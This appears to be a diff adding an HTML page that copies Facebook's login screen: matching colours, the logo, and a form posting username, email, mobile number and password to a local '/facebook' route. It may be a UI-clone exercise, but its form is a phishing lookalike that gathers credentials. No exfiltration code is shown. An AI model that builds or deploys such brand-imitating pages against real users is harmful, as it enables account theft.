@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f4f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .image img {
+      width: 240px;
+      margin-bottom: 20px;
+    }
+
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      width: 340px;
+      align-items: center;
+    }
+
+    .box p {
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+
+    .box input {
+      width: 300px;
+      border-radius: 3px;
+      margin: 10px 0;
+      padding: 14px 16px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    .box button {
+      width: 340px;
+      margin: 15px 0;
+      background-color: #1877f2;
+      color: white;
+      padding: 15px 16px;
+      border: none;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .box button:hover {
+      background-color: #166fe5;
+    }
+
+    .p p {
+      margin: 10px 0;
+      font-size: 14px;
+      color: #1877f2;
+      cursor: pointer;
+    }
+
+    .p p:hover {
+      text-decoration: underline;
+    }
+
+    .button {
+      background-color: #42b72a;
+      color: white;
+      font-weight: bold;
+    }
+
+    .button:hover {
+      background-color: #36a420;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="image">
+      <img src="image.png" alt="Facebook logo">
+    </div>
+    <div class="box">
+      <p>Log in to Facebook</p>
+      <form action="/facebook" method="POST">
+        <input type="text" name="username" placeholder="Username">
+        <input type="email" name="email" placeholder="Email">
+        <input type="text" name="mobile" placeholder="Mobile Number">
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+      </form>
+      <div class="p">
+        <p>Forgot Password?</p>
+        <p>Create New Account</p>
+      </div>
+      <button class="button">Create a New Account</button>
+    </div>
+  </div>
+</body>
+</html>
